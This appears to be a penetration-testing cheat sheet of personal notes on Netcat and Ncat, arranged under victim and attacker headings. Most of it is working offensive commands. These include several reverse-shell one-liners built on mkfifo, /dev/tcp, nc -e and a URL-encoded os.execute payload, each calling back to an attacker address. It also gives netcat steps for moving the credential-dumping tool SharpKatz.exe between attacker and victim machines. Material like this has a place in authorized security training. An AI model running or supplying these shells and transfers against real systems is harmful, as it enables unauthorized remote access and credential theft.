Netcat is a versatile networking tool that is often referred to as the "Swiss Army knife" of networking. It can be used for a wide range of tasks, such as port scanning, transferring files, and creating backdoors. Netcat operates by establishing connections between two computers over a network and can work with both TCP and UDP protocols.

The original Netcat was [released](http://seclists.org/bugtraq/1995/Oct/0028.html) by Hobbit in 1995, but it hasn't been maintained despite its popularity. The flexibility and usefulness of this tool prompted the Nmap Project to produce [Ncat](https://nmap.org/ncat/), a modern reimplementation that supports SSL, IPv6, SOCKS and HTTP proxies, connection brokering, and more.
# Guide

1. Windows version, see [[Powercat]]
## Creating Listeners

1. **Ensure** you are listening on a port the victim also has open

```
nc -nvlp <PORT> 
```

## Shell Commands 

#### Simple Shell 

On the Victim run:

```shell-session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

On the attacker run:

```shell-session
nc -nv 10.129.41.200 443
```

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.102.113 443 >/tmp/f
```

```
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
```

```
os.execute(%27nc%2010.10.14.133%204444%20-e%20/bin/bash%27)%20--
```

```
nc -c bash xxx xxx
```

```
mkfifo /tmp/grpoa; nc 192.168.56.1 1337 0</tmp/grpoa | /bin/sh >/tmp/grpoa 2>&1; rm /tmp/grpoa
```

## Data Transfer

## Connect from Attacker / Listener on Victim 

1. Setup listener 

```shell-session
nc -l -p 8000 > SharpKatz.exe
```

```shell-session
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

2. Send file

The option `-q 0` will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.

```shell-session
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

```shell-session
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```


## Connect from Victim / Listener on Attacker

1. Setup listener on attacker 

```shell-session
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

```shell-session
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

2. Receive file

```shell-session
nc 192.168.49.128 443 > SharpKatz.exe
```

```shell-session
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```


### Bash Listener 

```shell-session
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```
